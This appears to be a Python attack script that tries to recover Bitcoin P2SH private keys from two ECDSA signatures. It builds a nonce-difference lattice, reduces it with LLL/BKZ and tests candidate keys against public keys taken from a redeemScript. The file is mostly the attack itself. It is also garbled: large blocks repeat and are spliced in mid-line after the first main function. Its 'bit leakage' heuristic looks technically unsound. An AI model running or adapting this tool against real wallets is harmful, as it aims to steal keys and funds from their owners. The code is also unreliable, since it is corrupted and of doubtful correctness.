#!/usr/bin/env python3
# Clean & Fixed Lattice ECDSA k-difference Attack (2 sigs / P2SH)

import argparse, json, random
from fpylll import LLL, BKZ, IntegerMatrix
import ecdsa_lib


# --------------------------------------------------
# Utilities
# --------------------------------------------------

def int_to_bits(x, bits):
    return bin(x)[2:].zfill(bits)


def segmented_bit_similarity(x, y, bits):
    xb = int_to_bits(x, bits)
    yb = int_to_bits(y, bits)

    third = bits // 3
    return {
        "msb": sum(1 for a, b in zip(xb[:third], yb[:third]) if a == b),
        "mid": sum(1 for a, b in zip(xb[third:2*third], yb[third:2*third]) if a == b),
        "lsb": sum(1 for a, b in zip(xb[2*third:], yb[2*third:]) if a == b),
    }


def r_similarity_effect_exact(r1, r2, bits):
    seg = segmented_bit_similarity(r1, r2, bits)
    effective = seg["msb"] + seg["lsb"] + (seg["mid"] * 3) // 4
    return min(effective, 170), seg


def s_similarity_effect_exact(s1, s2, bits):
    seg = segmented_bit_similarity(s1, s2, bits)
    effective = seg["msb"] + seg["lsb"] + (seg["mid"] // 2)
    return min(effective, 140), seg

def reduce_lattice(B, block_size=None):
    if block_size is None:
        return LLL.reduction(B)

    try:
        par = BKZ.Param(
            block_size=block_size,
            strategies="default.json",
            auto_abort=False
        )
    except Exception as e:
        print(f"[!] BKZ strategy load failed ({e}) – fallback to plain BKZ")
        par = BKZ.Param(block_size=block_size, auto_abort=False)

    return BKZ.reduction(B, par)


def test_result(mat, pubkey, curve):
    n = ecdsa_lib.curve_n(curve)

    for row in mat:
        for x in row:
            d = abs(int(x)) % n
            if d == 0:
                continue
            if ecdsa_lib.privkey_to_pubkey(d, curve) == pubkey:
                return d
            d2 = (n - d) % n
            if ecdsa_lib.privkey_to_pubkey(d2, curve) == pubkey:
                return d2
    return 0


# --------------------------------------------------
# k-difference lattice
# --------------------------------------------------

def build_matrix_kdiff(sig1, sig2, curve, base_unknown_bits):
    n = ecdsa_lib.curve_n(curve)
    inv = ecdsa_lib.inverse_mod
    bits = ecdsa_lib.curve_size(curve)

    r1, s1, z1 = sig1["r"], sig1["s"], sig1["z"]
    r2, s2, z2 = sig2["r"], sig2["s"], sig2["z"]

    # --- exact bit leakage ---
    r_effective, r_seg = r_similarity_effect_exact(r1, r2, bits)
    s_effective, s_seg = s_similarity_effect_exact(s1, s2, bits)

    total_leak = r_effective + s_effective
    total_leak = min(total_leak, base_unknown_bits - 1)

    unknown_bits = max(1, base_unknown_bits - total_leak)

    print(
        f"[exact-leakage] "
        f"r(msb={r_seg['msb']},mid={r_seg['mid']},lsb={r_seg['lsb']})={r_effective} | "
        f"s(msb={s_seg['msb']},mid={s_seg['mid']},lsb={s_seg['lsb']})={s_effective} "
        f"→ unknown_bits={unknown_bits}"
    )

    # --- k-difference equation ---
    a = (r1 * inv(s1, n) - r2 * inv(s2, n)) % n
    b = (z2 * inv(s2, n) - z1 * inv(s1, n)) % n

    # --- lattice ---
    B = IntegerMatrix(3, 3)
    B[0, 0] = n
    B[1, 1] = n
    B[2, 2] = 1

    B[0, 2] = a
    B[1, 2] = b

    # |k1 - k2| < 2^unknown_bits
    B[2, 0] = 1 << unknown_bits

    return B


# --------------------------------------------------
# Bitcoin redeemScript parsing
# --------------------------------------------------

def extract_pubkeys_from_redeemscript(hexscript):
    s = bytes.fromhex(hexscript)
    pubs = []
    i = 0
    while i < len(s):
        l = s[i]
        if l in (33, 65) and i + 1 + l <= len(s):
            pubs.append(s[i+1:i+1+l])
            i += 1 + l
        else:
            i += 1
    return pubs


# --------------------------------------------------
# Main attack loop
# --------------------------------------------------

def loop_attack(sig1, sig2, pubkeys, curve, loops=3000):
    delta_candidates = [96, 100, 103, 106, 110]
    bkz_blocks = [None, 20, 30, 40, 50]

    for i in range(1, loops + 1):
        print(f"\n=== LOOP {i}/{loops} ===")
        random.shuffle(delta_candidates)
        random.shuffle(bkz_blocks)
        random.shuffle(pubkeys)

        for Q in pubkeys:
            for ub in delta_candidates:
                print(f"[*] unknown_bits = {ub}")
                B0 = build_matrix_kdiff(sig1, sig2, curve, ub)

                for bs in bkz_blocks:
                    B = IntegerMatrix.from_matrix(B0)
                    reduce_lattice(B, bs)
                    d = test_result(B, Q, curve)
                    if d:
                        print("\n✅ PRIVATE KEY FOUND")
                        print("d =", hex(d))
                        return d

    print("\n❌ Attack finished – no key found")
    return 0


# --------------------------------------------------
# CLI
# --------------------------------------------------

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--input", required=True, help="JSON input file")
    args = ap.parse_args()

    with open(args.input) as f:
        data = json.load(f)

    curve = data["curve"]
    sigs = data["signatures"]
    redeem = data["redeem_script"]

    if len(sigs) != 2:
        print("❌ Exactly 2 signatures required")
        return

    # parse signatures
    for s in sigs:
        s["r"] = int(s["r"], 16)
        s["s"] = int(s["s"], 16)
        s["z"] = int(s["hash"], 16)

    sig1, sig2 = sigs

    # extract pubkeys from redeemScript
    pubs_raw = extract_pubkeys_from_redeemscript(redeem)
    pubkeys = []

    for p in pubs_raw:
        try:
            Q = ecdsa_lib.pubkey_bytes_to_point(p, curve)
            if ecdsa_lib.check_publickey(Q, curve):
                pubkeys.append(Q)
        except Exception:
            pass

    if not pubkeys:
        print("❌ No valid pubkeys found in redeem script")
        return

    print(f"[+] {len(pubkeys)} pubkeys loaded")

    loop_attack(sig1, sig2, pubkeys, curve, loops=3000)
    
if __name__ == "__main__":
    main()        effective = seg["msb"] + seg["lsb"] + (seg["mid"] // 2)
    return min(effective, 140), seg

def reduce_lattice(B, block_size=None):
    if block_size is None:
        return LLL.reduction(B)

    try:
        par = BKZ.Param(
            block_size=block_size,
            strategies="default.json",
            auto_abort=False
        )
    except Exception as e:
        print(f"[!] BKZ strategy load failed ({e}) – fallback to plain BKZ")
        par = BKZ.Param(block_size=block_size, auto_abort=False)

    return BKZ.reduction(B, par)


def test_result(mat, pubkey, curve):
    n = ecdsa_lib.curve_n(curve)

    for row in mat:
        for x in row:
            d = abs(int(x)) % n
            if d == 0:
                continue
            if ecdsa_lib.privkey_to_pubkey(d, curve) == pubkey:
                return d
            d2 = (n - d) % n
            if ecdsa_lib.privkey_to_pubkey(d2, curve) == pubkey:
                return d2
    return 0


# --------------------------------------------------
# k-difference lattice
# --------------------------------------------------

def build_matrix_kdiff(sig1, sig2, curve, base_unknown_bits):
    n = ecdsa_lib.curve_n(curve)
    inv = ecdsa_lib.inverse_mod
    bits = ecdsa_lib.curve_size(curve)

    r1, s1, z1 = sig1["r"], sig1["s"], sig1["z"]
    r2, s2, z2 = sig2["r"], sig2["s"], sig2["z"]

    # --- exact bit leakage ---
    r_effective, r_seg = r_similarity_effect_exact(r1, r2, bits)
    s_effective, s_seg = s_similarity_effect_exact(s1, s2, bits)

    total_leak = r_effective + s_effective
    total_leak = min(total_leak, base_unknown_bits - 1)

    unknown_bits = max(1, base_unknown_bits - total_leak)

    print(
        f"[exact-leakage] "
        f"r(msb={r_seg['msb']},mid={r_seg['mid']},lsb={r_seg['lsb']})={r_effective} | "
        f"s(msb={s_seg['msb']},mid={s_seg['mid']},lsb={s_seg['lsb']})={s_effective} "
        f"→ unknown_bits={unknown_bits}"
    )

    # --- k-difference equation ---
    a = (r1 * inv(s1, n) - r2 * inv(s2, n)) % n
    b = (z2 * inv(s2, n) - z1 * inv(s1, n)) % n

    # --- lattice ---
    B = IntegerMatrix(3, 3)
    B[0, 0] = n
    B[1, 1] = n
    B[2, 2] = 1

    B[0, 2] = a
    B[1, 2] = b

    # |k1 - k2| < 2^unknown_bits
    B[2, 0] = 1 << unknown_bits

    return B


# --------------------------------------------------
# Bitcoin redeemScript parsing
# --------------------------------------------------

def extract_pubkeys_from_redeemscript(hexscript):
    s = bytes.fromhex(hexscript)
    pubs = []
    i = 0
    while i < len(s):
        l = s[i]
        if l in (33, 65) and i + 1 + l <= len(s):
            pubs.append(s[i+1:i+1+l])
            i += 1 + l
        else:
            i += 1
    return pubs


# --------------------------------------------------
# Main attack loop
# --------------------------------------------------

def loop_attack(sig1, sig2, pubkeys, curve, loops=3000):
    delta_candidates = [96, 100, 103, 106, 110]
    bkz_blocks = [None, 20, 30, 40, 50]

    for i in range(1, loops + 1):
        print(f"\n=== LOOP {i}/{loops} ===")
        random.shuffle(delta_candidates)
        random.shuffle(bkz_blocks)
        random.shuffle(pubkeys)

        for Q in pubkeys:
            for ub in delta_candidates:
                print(f"[*] unknown_bits = {ub}")
                B0 = build_matrix_kdiff(sig1, sig2, curve, ub)

                for bs in bkz_blocks:
                    B = IntegerMatrix.from_matrix(B0)
                    reduce_lattice(B, bs)
                    d = test_result(B, Q, curve)
                    if d:
                        print("\n✅ PRIVATE KEY FOUND")
                        print("d =", hex(d))
                        return d

    print("\n❌ Attack finished – no key found")
    return 0


# --------------------------------------------------
# CLI
# --------------------------------------------------

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--input", required=True, help="JSON input file")
    args = ap.parse_args()

    with open(args.input) as f:
        data = json.load(f)

    curve = data["curve"]
    sigs = data["signatures"]
    redeem = data["redeem_script"]

    if len(sigs) != 2:
        print("❌ Exactly 2 signatures required")
        return

    for s in sigs:
        s["r"] = int(s["r"], 16)
        s["s"] = int(s["s"], 16)
        s["z"] = int(s["hash"], 16)

    sig1, sig2 = sigs

    pubs_raw = extract_pubkeys_from_redeemscript(redeem)
    pubkeys = []

    for p in pubs_raw:
        try:
            Q = ecdsa_lib.pubkey_bytes_to_point(p, curve)
            if ecdsa_lib.check_publickey(Q, curve):
                pubkeys.append(Q)
        except:
            pass

    if not pubkeys:
        print("❌ No valid pubkeys")
        return

    print(f"[+] {len(pubkeys)} pubkeys loaded")

    loop_attack(sig1, sig2, pubkeys, curve, loops=3000)


if __name__ == "__main__":
    main()ap.parse_args()

    with open(args.input) as f:
        data = json.load(f)

    curve = data["curve"]
    sigs = data["signatures"]
    redeem = data["redeem_script"]

    if len(sigs) != 2:
        print("❌ Exactly 2 signatures required")
        return

    for s in sigs:
        s["r"] = int(s["r"], 16)
        s["s"] = int(s["s"], 16)
        s["z"] = int(s["hash"], 16)

    sig1, sig2 = sigs

    pubs_raw = extract_pubkeys_from_redeemscript(redeem)
    pubkeys = []

    for p in pubs_raw:
        try:
            Q = ecdsa_lib.pubkey_bytes_to_point(p, curve)
            if ecdsa_lib.check_publickey(Q, curve):
                pubkeys.append(Q)
        except:
            pass

    if not pubkeys:
        print("❌ No valid pubkeys")
        return

    print(f"[+] {len(pubkeys)} pubkeys loaded")

    loop_attack(sig1, sig2, pubkeys, curve, loops=3000)


if __name__ == "__main__":

    main()


